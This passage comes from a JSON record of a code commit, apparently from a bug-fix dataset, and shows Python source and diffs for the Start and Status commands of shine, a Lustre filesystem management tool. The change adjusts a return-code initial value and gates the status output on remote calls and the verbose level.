%s\" %(target.type.upper(), target.get_id(), target.dev, strerr) if rc: print message class Start(FSLiveCommand): \"\"\" shine start[-f <fsname>][-t <target>][-i <index(es)>][-n <nodes>][-qv] \"\"\" def __init__(self): FSLiveCommand.__init__(self) def get_name(self): return \"start\" def get_desc(self): return \"Start file system servers.\" target_status_rc_map={ \\ MOUNTED: RC_OK, RECOVERING: RC_OK, OFFLINE: RC_FAILURE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() target=self.target_support.get_target() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(LocalStartEventHandler(vlevel), GlobalStartEventHandler(vlevel)) fs_conf, fs=open_lustrefs(fsname, target, nodes=self.nodes_support.get_nodeset(), indexes=self.indexes_support.get_rangeset(), event_handler=eh) mount_options={} mount_paths={} for target_type in[ 'mgt', 'mdt', 'ost']: mount_options[target_type]=fs_conf.get_target_mount_options(target_type) mount_paths[target_type]=fs_conf.get_target_mount_path(target_type) fs.set_debug(self.debug_support.has_debug()) if hasattr(eh, 'pre'): eh.pre(fs) status=fs.start(mount_options=mount_options, mount_paths=mount_paths) rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Start successful.\" tuning=Tune.get_tuning(fs_conf) status=fs.tune(tuning) if status==RUNTIME_ERROR: rc=RC_RUNTIME_ERROR if rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) if hasattr(eh, 'post'): eh.post(fs) return rc ", "sourceWithComments": "# Start.py -- Start file system\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `start' command classes.\n\nThe start command aims to start Lustre filesystem servers or just some\nof the filesystem targets on local or remote servers. It is available\nfor any filesystems previously installed and formatted.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\nfrom Shine.Commands.Status import Status\nfrom Shine.Commands.Tune import Tune\n\n# Command base class\nfrom Base.FSLiveCommand import FSLiveCommand\nfrom Base.FSEventHandler import FSGlobalEventHandler\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\n\n# Shine Proxy Protocol\nfrom Shine.Lustre.Actions.Proxies.ProxyAction import *\nfrom Shine.Lustre.FileSystem import *\n\n\nclass GlobalStartEventHandler(FSGlobalEventHandler):\n\n    def __init__(self, verbose=1):\n        FSGlobalEventHandler.__init__(self, verbose)\n\n    def handle_pre(self, fs):\n        if self.verbose > 0:\n            print \"Starting %d targets on %s\" % (fs.target_count,\n                    fs.target_servers)\n\n    def handle_post(self, fs):\n        if self.verbose > 0:\n            Status.status_view_fs(fs, show_clients=False)\n\n    def ev_starttarget_start(self, node, target):\n        # start/restart timer if needed (we might be running a new runloop)\n        if self.verbose > 1:\n            print \"%s: Starting %s %s (%s)...\" % (node, \\\n                    target.type.upper(), target.get_id(), target.dev)\n        self.update()\n\n    def ev_starttarget_done(self, node, target):\n        self.status_changed = True\n        if self.verbose > 1:\n            if target.status_info:\n                print \"%s: Start of %s %s (%s): %s\" % \\\n                        (node, target.type.upper(), target.get_id(), target.dev,\n                                target.status_info)\n            else:\n                print \"%s: Start of %s %s (%s) succeeded\" % \\\n                        (node, target.type.upper(), target.get_id(), target.dev)\n        self.update()\n\n    def ev_starttarget_failed(self, node, target, rc, message):\n        self.status_changed = True\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to start %s %s (%s): %s\" % \\\n                (node, target.type.upper(), target.get_id(), target.dev,\n                        strerr)\n        if rc:\n            print message\n        self.update()\n\n\nclass LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_starttarget_start(self, node, target):\n        if self.verbose > 1:\n            print \"Starting %s %s (%s)...\" % (target.type.upper(),\n                    target.get_id(), target.dev)\n\n    def ev_starttarget_done(self, node, target):\n        if self.verbose > 1:\n            if target.status_info:\n                print \"Start of %s %s (%s): %s\" % (target.type.upper(),\n                        target.get_id(), target.dev, target.status_info)\n            else:\n                print \"Start of %s %s (%s) succeeded\" % (target.type.upper(),\n                        target.get_id(), target.dev)\n\n    def ev_starttarget_failed(self, node, target, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"Failed to start %s %s (%s): %s\" % (target.type.upper(),\n                target.get_id(), target.dev, strerr)\n        if rc:\n            print message\n\n\nclass Start(FSLiveCommand):\n    \"\"\"\n    shine start [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]\n    \"\"\"\n\n    def __init__(self):\n        FSLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"start\"\n\n    def get_desc(self):\n        return \"Start file system servers.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_OK,\n            RECOVERING : RC_OK,\n            OFFLINE : RC_FAILURE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        target = self.target_support.get_target()\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(LocalStartEventHandler(vlevel),\n                    GlobalStartEventHandler(vlevel))\n\n            # Open configuration and instantiate a Lustre FS.\n            fs_conf, fs = open_lustrefs(fsname, target,\n                    nodes=self.nodes_support.get_nodeset(),\n                    indexes=self.indexes_support.get_rangeset(),\n                    event_handler=eh)\n\n            # Prepare options...\n            mount_options = {}\n            mount_paths = {}\n            for target_type in [ 'mgt', 'mdt', 'ost' ]:\n                mount_options[target_type] = fs_conf.get_target_mount_options(target_type)\n                mount_paths[target_type] = fs_conf.get_target_mount_path(target_type)\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            # Will call the handle_pre() method defined by the event handler.\n            if hasattr(eh, 'pre'):\n                eh.pre(fs)\n                \n            status = fs.start(mount_options=mount_options,\n                              mount_paths=mount_paths)\n\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Start successful.\"\n                tuning = Tune.get_tuning(fs_conf)\n                status = fs.tune(tuning)\n                if status == RUNTIME_ERROR:\n                    rc = RC_RUNTIME_ERROR\n                # XXX improve tuning on start error handling\n\n            if rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n            if hasattr(eh, 'post'):\n                eh.post(fs)\n\n            return rc\n"}, "/lib/Shine/Commands/Status.py": {"changes": [{"diff": "\n \n     def execute(self):\n \n-        result = -1\n+        result = 0\n \n         self.init_execute()\n \n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Status.py", "badparts": ["        result = -1"], "goodparts": ["        result = 0"]}, {"diff": "\n             if rc > result:\n                 result = rc\n \n-            if view == \"fs\":\n-                self.status_view_fs(fs)\n-            elif view.startswith(\"target\"):\n-                self.status_view_targets(fs)\n-            elif view.startswith(\"disk\"):\n-                self.status_view_disks(fs)\n-            else:\n-                raise CommandBadParameterError(self.view_support.get_view(),\n-                        \"fs, targets, disks\")\n+            if not self.remote_call and vlevel > 0:\n+                if view == \"fs\":\n+                    self.status_view_fs(fs)\n+                elif view.startswith(\"target\"):\n+                    self.status_view_targets(fs)\n+                elif view.startswith(\"disk\"):\n+                    self.status_view_disks(fs)\n+                else:\n+                    raise CommandBadParameterError(self.view_support.get_view(),\n+                            \"fs, targets, disks\")\n+\n         return result\n \n     def status_view_targets(sel", "add": 11, "remove": 9, "filename": "/lib/Shine/Commands/Status.py", "badparts": ["            if view == \"fs\":", "                self.status_view_fs(fs)", "            elif view.startswith(\"target\"):", "                self.status_view_targets(fs)", "            elif view.startswith(\"disk\"):", "                self.status_view_disks(fs)", "            else:", "                raise CommandBadParameterError(self.view_support.get_view(),", "                        \"fs, targets, disks\")"], "goodparts": ["            if not self.remote_call and vlevel > 0:", "                if view == \"fs\":", "                    self.status_view_fs(fs)", "                elif view.startswith(\"target\"):", "                    self.status_view_targets(fs)", "                elif view.startswith(\"disk\"):", "                    self.status_view_disks(fs)", "                else:", "                    raise CommandBadParameterError(self.view_support.get_view(),", "                            \"fs, targets, disks\")"]}], "source": "\n \"\"\" Shine `status' command classes. The status command aims to return the real state of a Lustre filesystem and its components, depending of the requested \"view\". Status views let the Lustre administrator to either stand back and get a global status of the filesystem, or if needed, to enquire about filesystem components detailed states. \"\"\" from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSLiveCommand import FSLiveCommand from Base.CommandRCDefs import * from Base.Support.View import View from Base.RemoteCallEventHandler import RemoteCallEventHandler from Exceptions import CommandBadParameterError from Shine.FSUtils import open_lustrefs from Shine.Utilities.AsciiTable import * import Shine.Lustre.EventHandler from Shine.Lustre.Disk import * from Shine.Lustre.FileSystem import * from ClusterShell.NodeSet import NodeSet import os (KILO, MEGA, GIGA, TERA)=(1024, 1048576, 1073741824, 1099511627776) class GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_statustarget_start(self, node, target): pass def ev_statustarget_done(self, node, target): pass def ev_statustarget_failed(self, node, target, rc, message): print \"%s: Failed to status %s %s(%s)\" %(node, target.type.upper(), \\ target.get_id(), target.dev) print \">> %s\" % message def ev_statusclient_start(self, node, client): pass def ev_statusclient_done(self, node, client): pass def ev_statusclient_failed(self, node, client, rc, message): print \"%s: Failed to status of FS %s\" %(node, client.fs.fs_name) print \">> %s\" % message class Status(FSLiveCommand): \"\"\" shine status[-f <fsname>][-t <target>][-i <index(es)>][-n <nodes>][-qv] \"\"\" def __init__(self): FSLiveCommand.__init__(self) self.view_support=View(self) def get_name(self): return \"status\" def get_desc(self): return \"Check for file system target status.\" target_status_rc_map={ \\ MOUNTED: RC_ST_ONLINE, RECOVERING: RC_ST_RECOVERING, OFFLINE: RC_ST_OFFLINE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=-1 self.init_execute() vlevel=self.verbose_support.get_verbose_level() target=self.target_support.get_target() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalStatusEventHandler(vlevel)) fs_conf, fs=open_lustrefs(fsname, target, nodes=self.nodes_support.get_nodeset(), indexes=self.indexes_support.get_rangeset(), event_handler=eh) fs.set_debug(self.debug_support.has_debug()) status_flags=STATUS_ANY view=self.view_support.get_view() if view is None: view=\"fs\" else: view=view.lower() if view.startswith(\"disk\") or view.startswith(\"target\"): status_flags &=~STATUS_CLIENTS if view.startswith(\"client\"): status_flags &=~(STATUS_SERVERS|STATUS_HASERVERS) statusdict=fs.status(status_flags) if RUNTIME_ERROR in statusdict: defect_targets=statusdict[RUNTIME_ERROR] for nodes, msg in fs.proxy_errors: print nodes print '-' * 15 print msg print else: defect_targets=[] rc=self.fs_status_to_rc(max(statusdict.keys())) if rc > result: result=rc if view==\"fs\": self.status_view_fs(fs) elif view.startswith(\"target\"): self.status_view_targets(fs) elif view.startswith(\"disk\"): self.status_view_disks(fs) else: raise CommandBadParameterError(self.view_support.get_view(), \"fs, targets, disks\") return result def status_view_targets(self, fs): \"\"\" View: lustre targets \"\"\" print \"FILESYSTEM TARGETS(%s)\" % fs.fs_name class target_dict(dict): def __lt__(self, other): return self[\"index\"] < other[\"index\"] ldic=[] for type,(all_targets, enabled_targets) in fs.targets_by_type(): for target in enabled_targets: if target.state==OFFLINE: status=\"offline\" elif target.state==TARGET_ERROR: status=\"ERROR\" elif target.state==RECOVERING: status=\"recovering %s\" % target.status_info elif target.state==MOUNTED: status=\"online\" else: status=\"UNKNOWN\" ldic.append(target_dict([[\"target\", target.get_id()], [\"type\", target.type.upper()], [\"nodes\", NodeSet.fromlist(target.servers)], [\"device\", target.dev], [\"index\", target.index], [\"status\", status]])) ldic.sort() layout=AsciiTableLayout() layout.set_show_header(True) layout.set_column(\"target\", 0, AsciiTableLayout.LEFT, \"target id\", AsciiTableLayout.CENTER) layout.set_column(\"type\", 1, AsciiTableLayout.LEFT, \"type\", AsciiTableLayout.CENTER) layout.set_column(\"index\", 2, AsciiTableLayout.RIGHT, \"idx\", AsciiTableLayout.CENTER) layout.set_column(\"nodes\", 3, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER) layout.set_column(\"device\", 4, AsciiTableLayout.LEFT, \"device\", AsciiTableLayout.CENTER) layout.set_column(\"status\", 5, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) AsciiTable().print_from_list_of_dict(ldic, layout) def status_view_fs(cls, fs, show_clients=True): \"\"\" View: lustre FS summary \"\"\" ldic=[] for type,(a_targets, e_targets) in fs.targets_by_type(): nodes=NodeSet() t_offline=[] t_error=[] t_recovering=[] t_online=[] t_runtime=[] t_unknown=[] for target in a_targets: nodes.add(target.servers[0]) if target.state==OFFLINE: t_offline.append(target) elif target.state==TARGET_ERROR: t_error.append(target) elif target.state==RECOVERING: t_recovering.append(target) elif target.state==MOUNTED: t_online.append(target) elif target.state==RUNTIME_ERROR: t_runtime.append(target) else: t_unknown.append(target) status=[] if len(t_offline) > 0: status.append(\"offline(%d)\" % len(t_offline)) if len(t_error) > 0: status.append(\"ERROR(%d)\" % len(t_error)) if len(t_recovering) > 0: status.append(\"recovering(%d) for %s\" %(len(t_recovering), t_recovering[0].status_info)) if len(t_online) > 0: status.append(\"online(%d)\" % len(t_online)) if len(t_runtime) > 0: status.append(\"CHECK FAILURE(%d)\" % len(t_runtime)) if len(t_unknown) > 0: status.append(\"not checked(%d)\" % len(t_unknown)) if len(t_unknown) < len(a_targets): ldic.append(dict([[\"type\", \"%s\" % type.upper()], [\"count\", len(a_targets)],[\"nodes\", nodes], [\"status\", ', '.join(status)]])) if show_clients: (c_ign, c_offline, c_error, c_runtime, c_mounted)=fs.get_client_statecounters() status=[] if c_ign > 0: status.append(\"not checked(%d)\" % c_ign) if c_offline > 0: status.append(\"offline(%d)\" % c_offline) if c_error > 0: status.append(\"ERROR(%d)\" % c_error) if c_runtime > 0: status.append(\"CHECK FAILURE(%d)\" % c_runtime) if c_mounted > 0: status.append(\"mounted(%d)\" % c_mounted) ldic.append(dict([[\"type\", \"CLI\"],[\"count\", len(fs.clients)], [\"nodes\", \"%s\" % fs.get_client_servers()],[\"status\", ', '.join(status)]])) layout=AsciiTableLayout() layout.set_show_header(True) layout.set_column(\"type\", 0, AsciiTableLayout.CENTER, \"type\", AsciiTableLayout.CENTER) layout.set_column(\"count\", 1, AsciiTableLayout.RIGHT, \" layout.set_column(\"nodes\", 2, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER) layout.set_column(\"status\", 3, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) print \"FILESYSTEM COMPONENTS STATUS(%s)\" % fs.fs_name AsciiTable().print_from_list_of_dict(ldic, layout) status_view_fs=classmethod(status_view_fs) def status_view_disks(self, fs): \"\"\" View: lustre disks \"\"\" print \"FILESYSTEM DISKS(%s)\" % fs.fs_name class target_dict(dict): def __lt__(self, other): return self[\"index\"] < other[\"index\"] ldic=[] jdev_col_enabled=False tag_col_enabled=False for type,(all_targets, enabled_targets) in fs.targets_by_type(): for target in enabled_targets: if target.state==OFFLINE: status=\"offline\" elif target.state==RECOVERING: status=\"recovering %s\" % target.status_info elif target.state==MOUNTED: status=\"online\" elif target.state==TARGET_ERROR: status=\"ERROR\" elif target.state==RUNTIME_ERROR: status=\"CHECK FAILURE\" else: status=\"UNKNOWN\" if target.dev_size >=TERA: dev_size=\"%.1fT\" %(target.dev_size/TERA) elif target.dev_size >=GIGA: dev_size=\"%.1fG\" %(target.dev_size/GIGA) elif target.dev_size >=MEGA: dev_size=\"%.1fM\" %(target.dev_size/MEGA) elif target.dev_size >=KILO: dev_size=\"%.1fK\" %(target.dev_size/KILO) else: dev_size=\"%d\" % target.dev_size if target.jdev: jdev_col_enabled=True jdev=target.jdev else: jdev=\"\" if target.tag: tag_col_enabled=True tag=target.tag else: tag=\"\" flags=[] if target.has_need_index_flag(): flags.append(\"need_index\") if target.has_first_time_flag(): flags.append(\"first_time\") if target.has_update_flag(): flags.append(\"update\") if target.has_rewrite_ldd_flag(): flags.append(\"rewrite_ldd\") if target.has_writeconf_flag(): flags.append(\"writeconf\") if target.has_upgrade14_flag(): flags.append(\"upgrade14\") if target.has_param_flag(): flags.append(\"conf_param\") ldic.append(target_dict([\\ [\"nodes\", NodeSet.fromlist(target.servers)], [\"dev\", target.dev], [\"size\", dev_size], [\"jdev\", jdev], [\"type\", target.type.upper()], [\"index\", target.index], [\"tag\", tag], [\"label\", target.label], [\"flags\", ' '.join(flags)], [\"fsname\", target.fs.fs_name], [\"status\", status]])) ldic.sort() layout=AsciiTableLayout() layout.set_show_header(True) i=0 layout.set_column(\"dev\", i, AsciiTableLayout.LEFT, \"device\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"nodes\", i, AsciiTableLayout.LEFT, \"node(s)\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"size\", i, AsciiTableLayout.RIGHT, \"dev size\", AsciiTableLayout.CENTER) if jdev_col_enabled: i +=1 layout.set_column(\"jdev\", i, AsciiTableLayout.RIGHT, \"journal device\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"type\", i, AsciiTableLayout.LEFT, \"type\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"index\", i, AsciiTableLayout.RIGHT, \"index\", AsciiTableLayout.CENTER) if tag_col_enabled: i +=1 layout.set_column(\"tag\", i, AsciiTableLayout.LEFT, \"tag\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"label\", i, AsciiTableLayout.LEFT, \"label\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"flags\", i, AsciiTableLayout.LEFT, \"ldd flags\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"fsname\", i, AsciiTableLayout.LEFT, \"fsname\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"status\", i, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) AsciiTable().print_from_list_of_dict(ldic, layout) ", "sourceWithComments": "# Status.py -- Check remote filesystem servers and targets status\n# Copyright (C) 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `status' command classes.\n\nThe status command aims to return the real state of a Lustre filesystem\nand its components, depending of the requested \"view\". Status views let\nthe Lustre administrator to either stand back and get a global status\nof the filesystem, or if needed, to enquire about filesystem components\ndetailed states.\n\"\"\"\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSLiveCommand import FSLiveCommand\nfrom Base.CommandRCDefs import *\n# Additional options\nfrom Base.Support.View import View\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n\n# Error handling\nfrom Exceptions import CommandBadParameterError\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Command output formatting\nfrom Shine.Utilities.AsciiTable import *\n\n# Lustre events and errors\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.Disk import *\nfrom Shine.Lustre.FileSystem import *\n\nfrom ClusterShell.NodeSet import NodeSet\n\nimport os\n\n\n(KILO, MEGA, GIGA, TERA) = (1024, 1048576, 1073741824, 1099511627776)\n\n\nclass GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_statustarget_start(self, node, target):\n        pass\n\n    def ev_statustarget_done(self, node, target):\n        pass\n\n    def ev_statustarget_failed(self, node, target, rc, message):\n        print \"%s: Failed to status %s %s (%s)\" % (node, target.type.upper(), \\\n                target.get_id(), target.dev)\n        print \">> %s\" % message\n\n    def ev_statusclient_start(self, node, client):\n        pass\n\n    def ev_statusclient_done(self, node, client):\n        pass\n\n    def ev_statusclient_failed(self, node, client, rc, message):\n        print \"%s: Failed to status of FS %s\" % (node, client.fs.fs_name)\n        print \">> %s\" % message\n\n\nclass Status(FSLiveCommand):\n    \"\"\"\n    shine status [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]\n    \"\"\"\n\n    def __init__(self):\n        FSLiveCommand.__init__(self)\n        self.view_support = View(self)\n\n    def get_name(self):\n        return \"status\"\n\n    def get_desc(self):\n        return \"Check for file system target status.\"\n\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_ST_ONLINE,\n            RECOVERING : RC_ST_RECOVERING,\n            OFFLINE : RC_ST_OFFLINE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n\n        result = -1\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        target = self.target_support.get_target()\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None, GlobalStatusEventHandler(vlevel))\n\n            fs_conf, fs = open_lustrefs(fsname, target,\n                    nodes=self.nodes_support.get_nodeset(),\n                    indexes=self.indexes_support.get_rangeset(),\n                    event_handler=eh)\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status_flags = STATUS_ANY\n            view = self.view_support.get_view()\n\n            # default view\n            if view is None:\n                view = \"fs\"\n            else:\n                view = view.lower()\n\n            # disable client checks when not requested\n            if view.startswith(\"disk\") or view.startswith(\"target\"):\n                status_flags &= ~STATUS_CLIENTS\n            # disable servers checks when not requested\n            if view.startswith(\"client\"):\n                status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)\n\n            statusdict = fs.status(status_flags)\n\n            if RUNTIME_ERROR in statusdict:\n                # get targets that couldn't be checked\n                defect_targets = statusdict[RUNTIME_ERROR]\n\n                for nodes, msg in fs.proxy_errors:\n                    print nodes\n                    print '-' * 15\n                    print msg\n                print\n\n            else:\n                defect_targets = []\n\n            rc = self.fs_status_to_rc(max(statusdict.keys()))\n            if rc > result:\n                result = rc\n\n            if view == \"fs\":\n                self.status_view_fs(fs)\n            elif view.startswith(\"target\"):\n                self.status_view_targets(fs)\n            elif view.startswith(\"disk\"):\n                self.status_view_disks(fs)\n            else:\n                raise CommandBadParameterError(self.view_support.get_view(),\n                        \"fs, targets, disks\")\n        return result\n\n    def status_view_targets(self, fs):\n        \"\"\"\n        View: lustre targets\n        \"\"\"\n        print \"FILESYSTEM TARGETS (%s)\" % fs.fs_name\n\n        # override dict to allow target sorting by index\n        class target_dict(dict):\n            def __lt__(self, other):\n                return self[\"index\"] < other[\"index\"]\n\n        ldic = []\n        for type, (all_targets, enabled_targets) in fs.targets_by_type():\n            for target in enabled_targets:\n\n                if target.state == OFFLINE:\n                    status = \"offline\"\n                elif target.state == TARGET_ERROR:\n                    status = \"ERROR\"\n                elif target.state == RECOVERING:\n                    status = \"recovering %s\" % target.status_info\n                elif target.state == MOUNTED:\n                    status = \"online\"\n                else:\n                    status = \"UNKNOWN\"\n\n                ldic.append(target_dict([[\"target\", target.get_id()],\n                    [\"type\", target.type.upper()],\n                    [\"nodes\", NodeSet.fromlist(target.servers)],\n                    [\"device\", target.dev],\n                    [\"index\", target.index],\n                    [\"status\", status]]))\n\n        ldic.sort()\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        layout.set_column(\"target\", 0, AsciiTableLayout.LEFT, \"target id\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"type\", 1, AsciiTableLayout.LEFT, \"type\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"index\", 2, AsciiTableLayout.RIGHT, \"idx\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"nodes\", 3, AsciiTableLayout.LEFT, \"nodes\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"device\", 4, AsciiTableLayout.LEFT, \"device\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"status\", 5, AsciiTableLayout.LEFT, \"status\",\n                AsciiTableLayout.CENTER)\n\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n\n    def status_view_fs(cls, fs, show_clients=True):\n        \"\"\"\n        View: lustre FS summary\n        \"\"\"\n        ldic = []\n\n        # targets\n        for type, (a_targets, e_targets) in fs.targets_by_type():\n            nodes = NodeSet()\n            t_offline = []\n            t_error = []\n            t_recovering = []\n            t_online = []\n            t_runtime = []\n            t_unknown = []\n            for target in a_targets:\n                nodes.add(target.servers[0])\n\n                # check target status\n                if target.state == OFFLINE:\n                    t_offline.append(target)\n                elif target.state == TARGET_ERROR:\n                    t_error.append(target)\n                elif target.state == RECOVERING:\n                    t_recovering.append(target)\n                elif target.state == MOUNTED:\n                    t_online.append(target)\n                elif target.state == RUNTIME_ERROR:\n                    t_runtime.append(target)\n                else:\n                    t_unknown.append(target)\n\n            status = []\n            if len(t_offline) > 0:\n                status.append(\"offline (%d)\" % len(t_offline))\n            if len(t_error) > 0:\n                status.append(\"ERROR (%d)\" % len(t_error))\n            if len(t_recovering) > 0:\n                status.append(\"recovering (%d) for %s\" % (len(t_recovering),\n                    t_recovering[0].status_info))\n            if len(t_online) > 0:\n                status.append(\"online (%d)\" % len(t_online))\n            if len(t_runtime) > 0:\n                status.append(\"CHECK FAILURE (%d)\" % len(t_runtime))\n            if len(t_unknown) > 0:\n                status.append(\"not checked (%d)\" % len(t_unknown))\n\n            if len(t_unknown) < len(a_targets):\n                ldic.append(dict([[\"type\", \"%s\" % type.upper()],\n                    [\"count\", len(a_targets)], [\"nodes\", nodes],\n                    [\"status\", ', '.join(status)]]))\n\n        # clients\n        if show_clients:\n            (c_ign, c_offline, c_error, c_runtime, c_mounted) = fs.get_client_statecounters()\n            status = []\n            if c_ign > 0:\n                status.append(\"not checked (%d)\" % c_ign)\n            if c_offline > 0:\n                status.append(\"offline (%d)\" % c_offline)\n            if c_error > 0:\n                status.append(\"ERROR (%d)\" % c_error)\n            if c_runtime > 0:\n                status.append(\"CHECK FAILURE (%d)\" % c_runtime)\n            if c_mounted > 0:\n                status.append(\"mounted (%d)\" % c_mounted)\n\n            ldic.append(dict([[\"type\", \"CLI\"], [\"count\", len(fs.clients)],\n                [\"nodes\", \"%s\" % fs.get_client_servers()], [\"status\", ', '.join(status)]]))\n\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        layout.set_column(\"type\", 0, AsciiTableLayout.CENTER, \"type\", AsciiTableLayout.CENTER)\n        layout.set_column(\"count\", 1, AsciiTableLayout.RIGHT, \"#\", AsciiTableLayout.CENTER)\n        layout.set_column(\"nodes\", 2, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER)\n        layout.set_column(\"status\", 3, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER)\n\n        print \"FILESYSTEM COMPONENTS STATUS (%s)\" % fs.fs_name\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n    status_view_fs = classmethod(status_view_fs)\n\n\n    def status_view_disks(self, fs):\n        \"\"\"\n        View: lustre disks\n        \"\"\"\n\n        print \"FILESYSTEM DISKS (%s)\" % fs.fs_name\n\n        # override dict to allow target sorting by index\n        class target_dict(dict):\n            def __lt__(self, other):\n                return self[\"index\"] < other[\"index\"] \n        ldic = []\n        jdev_col_enabled = False\n        tag_col_enabled = False\n        for type, (all_targets, enabled_targets) in fs.targets_by_type():\n            for target in enabled_targets:\n\n                if target.state == OFFLINE:\n                    status = \"offline\"\n                elif target.state == RECOVERING:\n                    status = \"recovering %s\" % target.status_info\n                elif target.state == MOUNTED:\n                    status = \"online\"\n                elif target.state == TARGET_ERROR:\n                    status = 